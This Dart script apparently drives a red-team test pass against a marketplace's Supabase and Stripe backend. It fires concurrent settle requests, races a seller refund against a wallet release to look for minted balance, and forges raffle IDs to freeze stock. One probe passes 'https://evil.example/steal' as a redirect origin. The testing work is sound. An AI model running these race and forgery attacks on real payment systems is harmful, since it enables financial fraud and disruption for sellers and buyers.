/// PASS 3 — settle replay, pós-caixa na captura real, refund∥release, freeze residual.
import 'dart:convert';
import 'dart:io';

import '_rti4.dart';

Future<void> main() async {
  final c = await boot();
  const unlistPid = '8cc95520-3bff-4093-92b9-c556fe99dba7';
  const oidLive = 'edbabf9f-eabf-43b2-9582-fbe7269c8c85';
  const oidRaffle = '8450a8c0-5021-4ed3-9dfa-a0e6bd0db119';
  const cs =
      'cs_test_a1g5rjxfzkHH912tV3dQehcK9CiPsKUa57m8aB3qtrAnx1UKsh2YawNXdN';
  const liveId = 'dc7a0dd9-6bb1-43ee-9899-d4b5bf93960d';

  Future<Map<String, dynamic>?> row(String table, String id, String cols) async {
    final r = await rest(
      c.url,
      'GET',
      '$table?id=eq.$id&select=$cols',
      headers: c.svcH,
    );
    final maps = asMaps(decode(r));
    return maps.isEmpty ? null : maps.first;
  }

  Future<dynamic> avail() async {
    final r = await rpc(
      c.url,
      'batata_product_checkout_available',
      {
        'p_product_id': unlistPid,
        'p_exclude_order_id': null,
        'p_need_qty': 1,
      },
      headers: c.svcH,
    );
    return decode(r);
  }

  final w0 = await row('wallets', c.sellerId, 'id,balance');
  final o0 = await row('orders', oidLive,
      'id,status,amount_paid_cents,stripe_payment_intent_id,stripe_refund_id,wallet_release_processed_at,wallet_refund_processed_at,stock_units_applied,live_id,product_id');
  rec(surface: 'base', attack: 'wallet+order start pass3', identity: 'observe',
      result: 'w=$w0 o=$o0 avail=${await avail()}');

  // Dual settle GET
  final s1 = edge(c.url, 'create-payment-intent', null,
      headers: c.anonH,
      method: 'GET',
      query: {'session_id': cs, 'checkout_return': 'success'});
  final s2 = edge(c.url, 'create-payment-intent', null,
      headers: c.anonH,
      method: 'GET',
      query: {'session_id': cs, 'checkout_return': 'success'});
  final ss = await Future.wait([s1, s2]);
  rec(surface: 'settle', attack: 'dual GET settle paid session', identity: 'anon',
      result: '${briefBody(ss[0])} || ${briefBody(ss[1])}');
  final oSettle = await row('orders', oidLive,
      'id,status,amount_paid_cents,stock_units_applied');
  rec(surface: 'settle', attack: 'order after dual settle', identity: 'observe',
      result: jsonEncode(oSettle));

  // Repeat class: new unlist + same ended live → Session
  final pNew = await rest(c.url, 'POST', 'products', headers: c.svcH, body: {
    'seller_id': c.sellerId,
    'title': '$prefix unlist-repeat',
    'price': 7.5,
    'quantity': 1,
    'is_sold': false,
    'list_on_marketplace': false,
    'image_urls': <String>[],
  });
  final pidN = firstId(decode(pNew));
  if (pidN != null) {
    final holdN = await rest(c.url, 'POST', 'orders', headers: c.buyerH, body: {
      'buyer_id': c.buyerId,
      'seller_id': c.sellerId,
      'product_id': pidN,
      'quantity': 1,
      'price_total': 7.5,
      'status': 'reserva_pendente',
      'payment_method': 'pagamento na app',
      'shipping_method': 'carrier',
      'live_id': liveId,
    });
    rec(surface: 'repeat', attack: '2º SKU unlist + same ended live hold',
        identity: 'buyer', result: briefBody(holdN));
    final oidN = firstId(decode(holdN));
    if (oidN != null) {
      final ckN = await edge(c.url, 'create-payment-intent', {
        'buyer_id': c.buyerId,
        'seller_id': c.sellerId,
        'product_id': pidN,
        'order_id': oidN,
        'quantity': 1,
        'currency': 'eur',
        'shipping_method': 'carrier',
      }, headers: c.buyerH);
      rec(surface: 'repeat', attack: '2º SKU Session', identity: 'buyer',
          result: briefBody(ckN));
      if (looksSession(ckN)) {
        finding(
          id: 'RTI4-P1-UNLIST-LIVE-REPEAT',
          severity: 'P1',
          title: 'Mesma classe: 2.º SKU unlist + live ended → Session',
          actor: 'buyer JWT + Edge',
          pre: 'outro produto unlist; mesmo live ended',
          repro: 'hold live_id ended → checkout',
          impact: 'classe repetível (SESSION; 1 captura já feita no 1.º SKU)',
          evidence: briefBody(ckN),
        );
      }
    }
  }

  // Residual raffle freeze after capture
  final raffle = await row('orders', oidRaffle,
      'id,status,live_raffle_id,live_id,quantity,amount_paid_cents');
  rec(surface: 'freeze', attack: 'ghost raffle hold after capture',
      identity: 'observe', result: jsonEncode(raffle));
  rec(surface: 'freeze', attack: 'avail after capture+ghost hold',
      identity: 'observe', result: '${await avail()}');

  // Post-caixa real
  final ship = await rest(c.url, 'PATCH', 'orders?id=eq.$oidLive',
      headers: c.sellerH, body: {'status': 'enviado'});
  rec(surface: 'pos', attack: 'seller enviado after real capture',
      identity: 'seller', result: briefBody(ship));
  final oShip = await row('orders', oidLive, 'id,status');
  rec(surface: 'pos', attack: 'status after ship', identity: 'observe',
      result: jsonEncode(oShip));

  final done = await rest(c.url, 'PATCH', 'orders?id=eq.$oidLive',
      headers: c.buyerH, body: {'status': 'concluido'});
  rec(surface: 'pos', attack: 'buyer concluido after shipped',
      identity: 'buyer', result: briefBody(done));
  final oDone = await row('orders', oidLive,
      'id,status,wallet_release_processed_at,completed_at');
  rec(surface: 'pos', attack: 'status after concluido', identity: 'observe',
      result: jsonEncode(oDone));

  final w1 = await row('wallets', c.sellerId, 'id,balance');

  // Race refund ∥ release
  final relF = rpc(c.url, 'batata_release_seller_wallet_for_order',
      {'p_order_id': oidLive}, headers: c.buyerH);
  final refF = edge(c.url, 'refund-order', {'order_id': oidLive},
      headers: c.sellerH);
  final raced = await Future.wait([relF, refF]);
  rec(surface: 'race', attack: 'release∥refund after concluido', identity: 'buyer+seller',
      result: 'rel=${briefBody(raced[0])} ref=${briefBody(raced[1])}');

  final w2 = await row('wallets', c.sellerId, 'id,balance');
  final oF = await row('orders', oidLive,
      'id,status,amount_paid_cents,stripe_refund_id,wallet_release_processed_at,wallet_refund_processed_at,stripe_payment_intent_id');
  rec(surface: 'acct', attack: 'wallet Δ + order final', identity: 'observe',
      result: 'w0=$w0 w1=$w1 w2=$w2 order=$oF');

  final b0 = (w0?['balance'] as num?) ?? 0;
  final b2 = (w2?['balance'] as num?) ?? 0;
  final delta = b2 - b0;
  rec(surface: 'acct', attack: 'net wallet seller', identity: 'observe',
      result: 'Δ=$delta (captura 14.30; refund se stripe_refund_id)');

  if (delta > 0.01 && (oF?['stripe_refund_id'] != null)) {
    finding(
      id: 'RTI4-P0-RELEASE-REFUND-MINT',
      severity: 'P0',
      title: 'Release + refund: saldo vendedor subiu com refund Stripe',
      actor: 'buyer release ∥ seller refund',
      pre: 'order captura 14.30 concluido',
      repro: 'parallel release RPC + refund-order',
      impact: 'possível mint líquido',
      evidence: {'w0': w0, 'w2': w2, 'order': oF, 'delta': delta},
    );
  }

  // Connect with idempotency + evil origin
  final conn = await edge(c.url, 'create-connect-account', {
    'web_return_origin': 'https://evil.example/steal',
    'amount': 100,
    'idempotency_key': 'rti4-evil-${DateTime.now().millisecondsSinceEpoch}',
  }, headers: c.sellerH);
  rec(surface: 'connect', attack: 'evil origin + idempotency', identity: 'seller',
      result: briefBody(conn));
  final loc = conn.headers['location'] ?? '';
  if (loc.toLowerCase().contains('evil.example')) {
    finding(
      id: 'RTI4-P1-CONNECT-REDIRECT',
      severity: 'P1',
      title: 'Connect Location hostil',
      actor: 'seller',
      pre: 'web_return_origin evil',
      repro: 'POST create-connect-account',
      impact: 'open redirect',
      evidence: loc,
    );
  }

  // Isolated raffle freeze qty=1
  final pR = await rest(c.url, 'POST', 'products', headers: c.svcH, body: {
    'seller_id': c.sellerId,
    'title': '$prefix raffle-only-freeze',
    'price': 6.0,
    'quantity': 1,
    'is_sold': false,
    'list_on_marketplace': false,
    'image_urls': <String>[],
  });
  final pidR = firstId(decode(pR));
  if (pidR != null) {
    final hR = await rest(c.url, 'POST', 'orders', headers: c.buyerH, body: {
      'buyer_id': c.buyerId,
      'seller_id': c.sellerId,
      'product_id': pidR,
      'quantity': 1,
      'price_total': 6.0,
      'status': 'reserva_pendente',
      'payment_method': 'pagamento na app',
      'shipping_method': 'carrier',
      'live_raffle_id': '00000000-0000-4000-8000-000000000099',
    });
    rec(surface: 'raffle', attack: 'qty=1 unlist fake raffle hold',
        identity: 'buyer', result: briefBody(hR));
    final oidR = firstId(decode(hR));
    final cols = oidR == null
        ? null
        : await row('orders', oidR,
            'id,status,live_raffle_id,live_id,product_id');
    rec(surface: 'raffle', attack: 'persisted raffle cols', identity: 'observe',
        result: jsonEncode(cols));
    await rest(c.url, 'PATCH', 'products?id=eq.$pidR', headers: c.sellerH,
        body: {'list_on_marketplace': true});
    final av = await rpc(
      c.url,
      'batata_product_checkout_available',
      {'p_product_id': pidR, 'p_exclude_order_id': null, 'p_need_qty': 1},
      headers: c.svcH,
    );
    rec(surface: 'raffle', attack: 'avail after raffle-only hold + re-list',
        identity: 'observe', result: briefBody(av));
    final avj = decode(av);
    if (oidR != null &&
        avj is Map &&
        avj['ok'] == false &&
        (cols?['live_raffle_id'] == null)) {
      finding(
        id: 'RTI4-P1-RAFFLE-STRIP-FREEZE',
        severity: 'P1',
        title:
            'live_raffle_id forjado bypassa unlist no hold e depois é anulado — stock fica preso',
        actor: 'buyer JWT',
        pre: 'qty=1 unlist; live_raffle_id UUID inexistente',
        repro:
            'POST orders live_raffle_id fake → coluna null → seller lista → available=0',
        impact: 'DoS de stock sem live real e sem checkout',
        evidence: {'hold': briefBody(hR), 'row': cols, 'avail': avj},
      );
    }
  }

  await dumpJson('pass3', {
    'findings': findings,
    'matrix': matrix,
    'gaps': gaps,
    'production_touched': false,
    'fase4': false,
    'corrections_applied': false,
  });
  stderr.writeln('pass3 findings=${findings.length}');
}
